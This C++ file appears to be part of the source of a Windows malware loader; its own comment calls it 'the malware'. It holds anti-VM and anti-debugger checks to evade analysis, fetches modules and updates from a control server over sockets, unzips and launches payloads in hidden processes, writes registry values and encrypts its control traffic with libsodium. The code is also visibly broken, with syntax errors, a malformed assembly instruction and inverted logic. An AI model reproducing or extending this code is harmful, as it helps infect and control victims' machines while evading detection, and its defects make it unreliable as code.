#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <fstream>
#include <vector>
#include <windows.h>
#include <signal.h>
#include <string>
#include <setjmp.h>
#include "sodium.h"
#include "Loader.h"
#include "ZipFile.h"
#include "ZipArchive.h"

jmp_buf JMP_BUFF;
BOOL executed = FALSE;

void sighandler(int signum)
{
    if (signum == SIGSEGV)
    {
        executed = TRUE;
        longjmp(JMP_BUFF, 0);
    }
}

#define PROCESS_NOT_SPAWNED NULL
#define NUM_RETRIES 5



namespace Utils
{
    /**
     * @brief String splitting class
     * @param  std::string text
     * @param  std::string delimeter
     *
     */
    class Split
    {

    private:
        const char* delim;
        char* text;

    public:
        std::vector<std::string> strings;
        Split(std::string text, std::string delim)
        {
            this->delim = delim.c_str();
            this->text = (char*)text.c_str();
        }

        void split()
        {
            char* token = strtok(this->text, this->delim);
            while (token != NULL)
            {
                std::string tk = token;
                strings.push_back(tk);
                token = strtok(NULL, this->delim);
            }
        }
    };

    size_t getfilesize(std::string filename)
    {
        std::ifstream ifile;
        size_t size = 0;
        ifile.open(filename);
        if (ifile.is_open())
        {
            ifile.seekg(SEEK_END);
            size = ifile.tellg();
            ifile.close();
        }
        return size;
    }

    class Readline
    {
    private:
        char delim[2] = "\n";
        size_t size;
        char* buff = NULL;
        std::string line;
    public:
        Readline(std::string filename)
        {
            FILE* istream;
            istream = fopen(filename.c_str(), "r");
            if (istream == NULL)
            {
                std::cerr << "Error opening file" << std::endl;
            }

            this->size = getfilesize(filename);
            this->buff = new char[size + 1];
            fread(this->buff, 1, this->size, istream);
            line = this->buff;

            fclose(istream);
        }

        std::vector<std::string> readline()
        {
            Split sp{ line,this->delim };
            sp.split();
            return sp.strings;
        }
    };

    std::string StdGetEnv(std::string name)
    {
        char* buff = new char[MAX_PATH + 1];
        GetEnvironmentVariableA(name.c_str(), buff, MAX_PATH);
        std::string env = buff;
        return env;
    };

    class LoadConfig
    {

    private:
        std::string filename;
    public:
        std::vector<Module*> modules;
        LoadConfig(std::string filename)
        {
            this->filename = filename;
        };

        void load()
        {
            Readline rline{ this->filename };
            std::vector<std::string> lines = rline.readline();
            size_t size = lines.size();

            for (int i = 0; i < size; i++)
            {
                Module* m = new Module[1];
                Split sp{ lines[i],"  " };
                sp.split();

                std::vector<std::string> vec = sp.strings;

                m->filename = vec[0];
                m->ftype = (FTYPE)atoi(vec[1].c_str());
                m->hProcess = PROCESS_NOT_SPAWNED;

                modules.push_back(m);    
            }
        }

        virtual ~LoadConfig() {};
    };

    BOOL createFile(std::string filename, std::string mode)
    {
        FILE* istream;
        istream = fopen(filename.c_str(), mode.c_str());
        if (istream == NULL)
        {
            return FALSE;
        }
        fclose(istream);
        return TRUE;
    }

    void WriteReg(std::string valuename, DWORD dwType, std::string SubKey, std::string data)
    {
        HKEY hkey;
        RegOpenKeyExA(HKEY_CURRENT_USER, SubKey.c_str(), 0, KEY_SET_VALUE, &hkey);
        RegSetValueExA(hkey, valuename.c_str(), 0, dwType, (BYTE*)data.c_str(), data.length());
        RegCloseKey(hkey);
    }

    /**
     * @brief Check to see if the malware is running in a virtual machine.
     * VMWare specifically. Uses a trick vmware hypervisor uses to communicate
     * between guest operating system and the hypervisor. It sets up the registers
     * of the CPU with values that would cause vmware hypervisor to recieve
     * communication commands from the guest once the IN (instruction is called)
     * Ideally on a host machine with no virtualisation, the IN instruction would
     * trigger an illegal instruction fault from the operating system when executed in
     * non-priveleged mode, but the vmware hypervisor intercepts execution of this
     * instruction to see if it's a call to the hypervisor for communication like
     * clipboard sharing, file-sharing etc.
     * The IN instruction is used to get the port address of a port with a
     * given port number and passes the address into a given register provided
     * as the destination operand for the instruction. The source operand is the
     * port number
     *
     * It also checks if debugger is present by called the win32 function
     * IsDebuggerPresent()
     * @param  void
     * @return BOOL
     */
    BOOL AntiVM()
    {
        signal(SIGSEGV, sighandler);
        bool isVMware = false;
        setjmp(JMP_BUFF);

        if (!executed)
        {
            _asm
            {
                mov rax, 0x564D5868;   //Corresponds to "VMXh"
                mov rbx, 0;
                mov rcx, 0xA;
                mov rbx, 0x5658;    //Corresponds to "VX"
                in  rax, dx;       // IsPrevilegedInstruction on host machine
                cmp rbx, 0x564D5868;
                jgne end;
            };

            isVMware = true;
        }

    end:
       
        return IsDebuggerPresent() || isVMware;
    }

    BOOL WSAInit()
    {
        WSAData wsadata;
        int iRes = WSAStartup(MAKEWORD(2, 2), &wsadata);
        if (iRes != 0)
            return FALSE;
        return TRUE;
    }

    void WSAClose()
    {
        WSACleanup();
    }

    BOOL CreateDir(std::string dirname)
    {
        return CreateDirectoryA(dirname.c_str(), NULL);
    }

    void UnzipFile(std::string filename, std::string dir, std::string password = "")
    {
        BOOL bStatus;
        size_t size = getfilesize(filename);
        ZipArchive::Ptr archive = ZipFile::Open(filename);
        size_t numEntries = archive->GetEntriesCount();
        Split sp{ filename,"." };
        sp.split();
        std::string dirname = sp.strings[0];

        bStatus = CreateDir(dirname);
        if (bStatus)
        {
            for (int i = 0; i < numEntries; i++)
            {
                ZipArchiveEntry::Ptr entry = archive->GetEntry(i);
                std::string ent_name = entry->GetName();
                size_t ent_size = entry->GetSize();
                std::ofstream out;
                char* buff = new char[ent_size];

                if (entry->IsPasswordProtected())
                {
                    entry->SetPassword(password);
                }

                std::istream* decompressionStream = entry->GetDecompressionStream();
                decompressionStream->read(buff, ent_size);
                createFile(dirname.append(ent_name), "wb");

                out.open(ent_name, std::ios::binary);
                if (out.is_open())
                {
                    out.write(buff, ent_size);
                }

                out.close();
                delete[] buff;
            }
        }
    }

    BOOL GetModule(SOCKET *s,std::string name = "")
    {
        BOOL isZipped = FALSE;
        Control ctrl;
        HANDLE hFile;
        std::string filename;
        size_t size;
        DWORD attr;
        FTYPE ftype;
        ZeroMemory(&ctrl, sizeof(Control));

        if (name != "")
        {
            ctrl.ControlCode = CODE_GET_ONE;
            strncpy((char*)ctrl.payload, name.c_str(), name.length());
        }

        else
            ctrl.ControlCode = CODE_GET_ALL;

        send(*s, (char*)&ctrl, sizeof(Control), 0);
        ZeroMemory(&ctrl, sizeof(Control));
        recv(*s, (char*)&ctrl, sizeof(Control), 0);

        if (ctrl.ResponseCode == CODE_SUCCESS)
        {
            filename = ctrl.MetaData.Filename;
            size = ctrl.MetaData.Filesize;
            attr = ctrl.MetaData.FileAttributes;
            ftype = ctrl.MetaData.FileType;
            isZipped = (ftype == ZIP) ? TRUE : FALSE;
        }

        hFile = CreateFileA(filename.c_str(), GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, attr, NULL);
        WriteFile(hFile, ctrl.payload, size, nullptr, nullptr);
        CloseHandle(hFile);

        if (isZipped)
            UnzipFile(filename, StdGetEnv("HOMEDRIVE"));

        return TRUE;

    }


    BOOL UpdateAvailable(SOCKET *s)
    {
        Control ctrl;
        ctrl.ControlCode = CODE_UPDATE;
        send(*s,(char*)&ctrl,sizeof(Control),0);
        ZeroMemory(&ctrl, sizeof(ctrl));
        recv(*s, (char*)&ctrl, sizeof(Control), 0);

        if (ctrl.ResponseCode == CODE_SUCCESS && ctrl.ControlCode == CODE_NO_UPDATE)
        {
            return FALSE;
        }
        return TRUE && ctrl.ResponseCode;
    }

    HANDLE StdCreateProcess(std::string filename,std::string args = "")
    {
        PROCESS_INFORMATION pinfo;
        STARTUPINFOA stinfo;
        BOOL bCreated = FALSE;
        ZeroMemory(&stinfo, sizeof(STARTUPINFOA));
        ZeroMemory(&pinfo, sizeof(PROCESS_INFORMATION));

        stinfo.cb = sizeof(STARTUPINFOA);
        bCreated = CreateProcessA(filename.c_str(),(char*)args.c_str(), NULL, NULL, FALSE,
            NORMAL_PRIORITY_CLASS||CREATE_NO_WINDOW,NULL,NULL,&stinfo,&pinfo);

        if (bCreated)
            return pinfo.hProcess;
            
        return NULL;
    }



    BOOL* LoadModules(std::vector<Module*> modules)
    {
        size_t size = modules.size();
        BOOL bBinary = FALSE;
        BOOL* bState = new BOOL[size];
        for (int i = 0; i < size; i++)
        {
            int num = NUM_RETRIES;
            Module* m = modules[i];
            bBinary = (m->ftype == BINARY) ? TRUE : FALSE;
        again:

            if (bBinary)
            {
                m->hProcess = StdCreateProcess(m->filename);
            }
            else {
                std::string app = "pyw.exe";
                m->hProcess = StdCreateProcess(app, m->filename);
            }

            if (m->hProcess == NULL)
            {
                num--;
                goto again;
                bState[i] = FALSE;
            }
            bState[i] = TRUE;
        }
        
        return bState;
    }


    BOOL UpdateModule(std::vector<Module*> modules, std::string name,std::string tmpfile)
    {
        size_t size = modules.size();
        int index = -1;
        static HANDLE hProcess = nullptr;
        BOOL bCopied = FALSE;

        for (int j = 0; j < size; j++)
        {
            Module* m = modules[j];
            if (m->filename == name)
            {
                index = j;
                break;
            }
        }

        if ((index == -1))
            return FALSE;

        Module* m = modules[index];
        CloseHandle(m->hProcess);

        bCopied = CopyFileA(tmpfile.c_str(), m->filename.c_str(), FALSE);
        if (bCopied)
        {
            DeleteFileA(tmpfile.c_str());
            if (m->ftype == TEXT)
            {
                hProcess = StdCreateProcess("pyw.exe", m->filename);
            }
            hProcess = StdCreateProcess(m->filename);
            
            if (hProcess == NULL)
                return FALSE;

            m->hProcess = hProcess;
        }

        return TRUE;
    }

    void UpdateConfig(std::string configFile,std::string newEntry,FTYPE ftype)
    {
        char* entry = new char[newEntry.size() + 10];
        snprintf(entry, newEntry.size() + 10, "%s  %d",newEntry.c_str(),ftype);
        size_t size = getfilesize(configFile);
        char* buff = new char[size + newEntry.size() + 10];
        char* cat = nullptr;

        std::ifstream istream;
        istream.open(configFile);
        istream.read(buff, size);
        istream.close();

        strcat(buff,entry);

        std::ofstream ostream;
        ostream.open(configFile);
        ostream.write(buff, size + newEntry.size() + 10);
        ostream.close();
        delete[] entry, buff;
    }
     
    /*
    * Script obtained from url. 
    * https://stackoverflow.com/questions/2112252/how-do-i-check-whether-a-file-exists-in-c-for-a-windows-program
    */
    BOOL FileExists(std::string filename)
    {
        DWORD attr = GetFileAttributesA(filename.c_str());
        return (attr == INVALID_FILE_ATTRIBUTES) && (GetLastError() == ERROR_FILE_NOT_FOUND);
    }


    BOOL IsProcessElevated()
    {
        BOOL fIsElevated = FALSE;
        HANDLE hToken = NULL;
        TOKEN_ELEVATION elevation;
        DWORD dwSize;

        if (!(OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)))
        {
            printf("\n Failed to get Process Token :%d.", GetLastError());
            goto Cleanup;
        }

        if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
        {
            printf("\nFailed to get Token Information :%d.", GetLastError());
            goto Cleanup;
        }

        fIsElevated = elevation.TokenIsElevated;

    Cleanup:
        if (hToken)
        {
            CloseHandle(hToken);
            hToken = NULL;
        }

        return fIsElevated;
    }
    namespace Crypto
    {
        class CryptPubKey
        {
        private:
            byte public_key[crypto_box_PUBLICKEYBYTES];
            byte secret_key[crypto_box_SECRETKEYBYTES];
            SOCKET* sock;
        public:
            byte recv_public_key[crypto_box_PUBLICKEYBYTES];
            byte nonce[crypto_box_NONCEBYTES];
            byte* cipher_text = nullptr;
            byte* plain_text  = nullptr;
            size_t clen;
            CryptPubKey(SOCKET *s)
            {
                this->sock = s;
                Control ctrl;
                crypto_box_keypair(this->public_key, this->secret_key);
                ctrl.ControlCode = CODE_MY_PUBLIC_KEY;
                memcpy(ctrl.payload, this->public_key,crypto_box_PUBLICKEYBYTES);
                send(*s, (char*)&ctrl, sizeof(Control), 0);
                recv(*s, (char*)&ctrl,  sizeof(Control), 0);
                if (ctrl.ResponseCode == CODE_SUCCESS)
                {
                    ZeroMemory(&ctrl, sizeof(Control));
                    recv(*s, (char*)&ctrl, sizeof(Control), 0);
                    if (ctrl.ResponseCode == CODE_SUCCESS && ctrl.ResponseCode == CODE_MY_PUBLIC_KEY)
                    {
                        memcpy(this->recv_public_key,ctrl.payload, crypto_box_PUBLICKEYBYTES);
                        send(*s, (char*)&ctrl, sizeof(Control), 0);
                    }
                }
            }

            BOOL encrypt(byte* message, size_t mlen, byte* recv_public_key)
            {
                static size_t cipherlen = mlen + crypto_box_MACBYTES;
                this->cipher_text = new byte[cipherlen];
                randombytes_buf(this->nonce, sizeof(nonce));
                this->plain_text = message;
                if (crypto_box_easy(this->cipher_text, this->plain_text, mlen, this->nonce,recv_public_key, this->secret_key) != 0)
                {
                    return FALSE;
                }
                this->clen = cipherlen;
                return TRUE;
            }

            BOOL decrypt(byte* ciphertext, size_t clen, byte* nonce, byte *recv_public_key)
            {
                if (crypto_box_open_easy(this->plain_text, ciphertext, clen, nonce,recv_public_key, this->secret_key) != 0)
                {
                    return FALSE;
                }
                return TRUE;
            }

        };

        
        class CryptSymKey
        {
        private:
            byte* key = nullptr;
        public:
            byte nonce[crypto_secretbox_NONCEBYTES];
            CryptSymKey(byte *key)
            {
                this->key = key;
            }

            byte* encrypt(byte* message, size_t mlen)
            {
                size_t clen = mlen + crypto_secretbox_MACBYTES;
                randombytes_buf(nonce, crypto_secretbox_NONCEBYTES);
                byte* ciphertext = new byte[clen]
                if (crypto_secretbox_easy(ciphertext, message, mlen, nonce, key) != 0)
                    return nullptr;
                
                return ciphertext;
            }

            byte* decrypt(byte* ciphertext, size_t clen,byte* nonce)
            {
                size_t mlen = clen - crypto_secretbox_MACBYTES;
                byte* message = new byte[mlen];

                if (crypto_secretbox_open_easy(message, ciphertext, clen, nonce, this->key) != 0)
                    return nullptr;
                return message;
            }

            virtual ~CryptSymKey() 
            {
                delete[] nonce;
            };
        };

        byte* GetSessionKey(SOCKET* s)
        {
            CryptPubKey cpk{s};
            Control ctrl;
            ctrl.ControlCode = CODE_GET_SESSION_KEY;
            cpk.encrypt((byte*)&ctrl, sizeof(Control), cpk.recv_public_key);
            send(*s,(char*)cpk.cipher_text,cpk.clen, 0);
            recv(*s, (char*)cpk.cipher_text,cpk.clen, 0);
            cpk.decrypt(cpk.cipher_text, cpk.clen, cpk.nonce, cpk.recv_public_key);
            return cpk.plain_text;
        }

    }


}
